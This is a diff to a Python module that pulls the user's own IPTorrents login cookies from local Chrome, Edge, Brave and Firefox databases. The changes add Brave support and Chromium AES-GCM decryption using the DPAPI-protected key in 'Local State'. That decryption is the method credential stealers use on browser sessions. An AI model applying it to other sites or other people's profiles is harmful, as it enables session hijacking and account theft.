@@ -1,13 +1,15 @@
 """
 Browser Cookie Extractor for IPT Browser
 Extracts IPTorrents cookies from local browser databases
-Supports: Chrome, Edge, Firefox
+Supports: Chrome, Edge, Firefox, Brave
 """
 
 import os
 import sqlite3
 import shutil
 import tempfile
+import json
+import base64
 from datetime import datetime
 
 # Windows DPAPI for Chrome/Edge cookie decryption
@@ -18,6 +20,14 @@ except ImportError:
     DPAPI_AVAILABLE = False
     print("Warning: win32crypt not available. Chrome/Edge extraction will not work.")
 
+# AES encryption for newer Chrome versions (80+)
+try:
+    from Crypto.Cipher import AES
+    AES_AVAILABLE = True
+except ImportError:
+    AES_AVAILABLE = False
+    print("Warning: PyCryptodome not available. Modern Chrome/Edge extraction may not work.")
+
 
 class BrowserCookieExtractor:
     """Extract IPTorrents cookies from local browser databases"""
@@ -25,6 +35,104 @@ class BrowserCookieExtractor:
     def __init__(self):
         self.domain = 'iptorrents.com'
         self.required_cookies = ['uid', 'pass']
+        self._encryption_key_cache = {}
+
+    def _get_encryption_key(self, browser_path):
+        """
+        Get the encryption key from browser's Local State file
+
+        Args:
+            browser_path: Path to browser's User Data directory
+
+        Returns:
+            bytes: Decrypted encryption key, or None if not found
+        """
+        # Check cache first
+        if browser_path in self._encryption_key_cache:
+            return self._encryption_key_cache[browser_path]
+
+        local_state_path = os.path.join(browser_path, 'Local State')
+
+        if not os.path.exists(local_state_path):
+            return None
+
+        try:
+            with open(local_state_path, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+
+            # Get encrypted key from Local State
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+
+            # Remove 'DPAPI' prefix (first 5 bytes)
+            encrypted_key = encrypted_key[5:]
+
+            # Decrypt using DPAPI
+            if DPAPI_AVAILABLE:
+                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                self._encryption_key_cache[browser_path] = key
+                return key
+
+        except Exception as e:
+            print(f"Error getting encryption key: {e}")
+
+        return None
+
+    def _decrypt_cookie_value(self, encrypted_value, encryption_key=None):
+        """
+        Decrypt cookie value using either AES (new) or DPAPI (old)
+
+        Args:
+            encrypted_value: Encrypted cookie value
+            encryption_key: AES key for new encryption method
+
+        Returns:
+            str: Decrypted cookie value
+        """
+        if not encrypted_value:
+            return ""
+
+        # Check if it's AES encrypted (starts with 'v10', 'v11', or 'v20')
+        if encrypted_value[:3] in (b'v10', b'v11', b'v20'):
+            if not AES_AVAILABLE or not encryption_key:
+                raise Exception("AES decryption not available. Install pycryptodome: pip install pycryptodome")
+
+            # Extract components
+            # v10/v11/v20 (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
+            nonce = encrypted_value[3:15]
+            ciphertext_with_tag = encrypted_value[15:]
+
+            # Split ciphertext and tag
+            ciphertext = ciphertext_with_tag[:-16]
+            tag = ciphertext_with_tag[-16:]
+
+            # Create AES-GCM cipher
+            cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)
+
+            # Decrypt and verify
+            try:
+                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            except ValueError as e:
+                # v20 might use app-bound encryption
+                if encrypted_value[:3] == b'v20':
+                    raise Exception(
+                        "This browser uses app-bound encryption (v20) which cannot be decrypted by external tools. "
+                        "Please manually copy your cookie from the browser:\n"
+                        "1. Open browser DevTools (F12)\n"
+                        "2. Go to Application/Storage → Cookies\n"
+                        "3. Find iptorrents.com cookies (uid and pass)\n"
+                        "4. Copy the values and format as: uid=VALUE; pass=VALUE"
+                    )
+                # For v10/v11, try without verification
+                cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)
+                decrypted = cipher.decrypt(ciphertext)
+
+            return decrypted.decode('utf-8')
+        else:
+            # Old DPAPI encryption
+            if not DPAPI_AVAILABLE:
+                raise Exception("DPAPI decryption not available. Install pywin32.")
+
+            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
 
     def detect_browsers(self):
         """
@@ -52,6 +160,16 @@ class BrowserCookieExtractor:
                 'name': 'Edge',
                 'id': 'edge',
                 'path': edge_path,
+                'available': True
+            })
+
+        # Brave
+        brave_path = self._get_brave_cookie_path()
+        if brave_path and os.path.exists(brave_path):
+            browsers.append({
+                'name': 'Brave',
+                'id': 'brave',
+                'path': brave_path,
                 'available': True
             })
 
@@ -133,6 +251,38 @@ class BrowserCookieExtractor:
 
         return self._extract_chromium_cookies(cookie_path, 'Edge', profile)
 
+    def extract_from_brave(self, profile='Default'):
+        """
+        Extract cookies from Brave
+
+        Args:
+            profile: Brave profile name (default: "Default")
+
+        Returns:
+            dict: {success, cookie, browser, profile, error}
+        """
+        if not DPAPI_AVAILABLE:
+            return {
+                'success': False,
+                'cookie': None,
+                'browser': 'Brave',
+                'profile': profile,
+                'error': 'win32crypt library not available. Install pywin32.'
+            }
+
+        cookie_path = self._get_brave_cookie_path(profile)
+
+        if not cookie_path or not os.path.exists(cookie_path):
+            return {
+                'success': False,
+                'cookie': None,
+                'browser': 'Brave',
+                'profile': profile,
+                'error': f'Brave cookie database not found at {cookie_path}'
+            }
+
+        return self._extract_chromium_cookies(cookie_path, 'Brave', profile)
+
     def extract_from_firefox(self, profile=None):
         """
         Extract cookies from Firefox
@@ -166,7 +316,7 @@ class BrowserCookieExtractor:
 
     def _extract_chromium_cookies(self, cookie_path, browser_name, profile):
         """
-        Extract cookies from Chromium-based browsers (Chrome, Edge)
+        Extract cookies from Chromium-based browsers (Chrome, Edge, Brave)
 
         Args:
             cookie_path: Path to cookie database
@@ -176,6 +326,16 @@ class BrowserCookieExtractor:
         Returns:
             dict: Result dictionary
         """
+        # Get browser's User Data path (parent directory of profile)
+        # cookie_path format: .../User Data/Profile/Network/Cookies
+        user_data_path = os.path.dirname(os.path.dirname(cookie_path))
+        if cookie_path.endswith(os.path.join('Network', 'Cookies')):
+            # New format: .../User Data/Profile/Network/Cookies
+            user_data_path = os.path.dirname(os.path.dirname(os.path.dirname(cookie_path)))
+
+        # Get encryption key for AES decryption
+        encryption_key = self._get_encryption_key(user_data_path)
+
         # Copy database to temp file (browser might have it locked)
         temp_dir = tempfile.gettempdir()
         temp_cookie_path = os.path.join(temp_dir, f'cookies_{browser_name.lower()}.sqlite')
@@ -226,8 +386,8 @@ class BrowserCookieExtractor:
             for name, encrypted_value, expires_utc in rows:
                 if name in self.required_cookies:
                     try:
-                        # Decrypt using Windows DPAPI
-                        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
+                        # Decrypt using new method (handles both AES and DPAPI)
+                        decrypted_value = self._decrypt_cookie_value(encrypted_value, encryption_key)
                         cookies[name] = decrypted_value
                     except Exception as e:
                         print(f"Error decrypting {name} cookie: {e}")
@@ -378,6 +538,12 @@ class BrowserCookieExtractor:
         if not local_app_data:
             return None
 
+        # Try new location first (Chrome 96+)
+        cookie_path = os.path.join(local_app_data, 'Google', 'Chrome', 'User Data', profile, 'Network', 'Cookies')
+        if os.path.exists(cookie_path):
+            return cookie_path
+
+        # Fall back to old location
         cookie_path = os.path.join(local_app_data, 'Google', 'Chrome', 'User Data', profile, 'Cookies')
         return cookie_path if os.path.exists(cookie_path) else None
 
@@ -387,7 +553,28 @@ class BrowserCookieExtractor:
         if not local_app_data:
             return None
 
+        # Try new location first (Edge 96+)
+        cookie_path = os.path.join(local_app_data, 'Microsoft', 'Edge', 'User Data', profile, 'Network', 'Cookies')
+        if os.path.exists(cookie_path):
+            return cookie_path
+
+        # Fall back to old location
         cookie_path = os.path.join(local_app_data, 'Microsoft', 'Edge', 'User Data', profile, 'Cookies')
+        return cookie_path if os.path.exists(cookie_path) else None
+
+    def _get_brave_cookie_path(self, profile='Default'):
+        """Get Brave cookie database path"""
+        local_app_data = os.getenv('LOCALAPPDATA')
+        if not local_app_data:
+            return None
+
+        # Try new location first (Brave 96+)
+        cookie_path = os.path.join(local_app_data, 'BraveSoftware', 'Brave-Browser', 'User Data', profile, 'Network', 'Cookies')
+        if os.path.exists(cookie_path):
+            return cookie_path
+
+        # Fall back to old location
+        cookie_path = os.path.join(local_app_data, 'BraveSoftware', 'Brave-Browser', 'User Data', profile, 'Cookies')
         return cookie_path if os.path.exists(cookie_path) else None
 
     def _get_firefox_cookie_paths(self):
@@ -425,7 +612,7 @@ def extract_cookie_from_browser(browser='chrome', profile='Default'):
     Quick extraction function
 
     Args:
-        browser: Browser name ('chrome', 'edge', 'firefox')
+        browser: Browser name ('chrome', 'edge', 'brave', 'firefox')
         profile: Profile name
 
     Returns:
@@ -437,6 +624,8 @@ def extract_cookie_from_browser(browser='chrome', profile='Default'):
         return extractor.extract_from_chrome(profile)
     elif browser.lower() == 'edge':
         return extractor.extract_from_edge(profile)
+    elif browser.lower() == 'brave':
+        return extractor.extract_from_brave(profile)
     elif browser.lower() == 'firefox':
         return extractor.extract_from_firefox(profile)
     else:
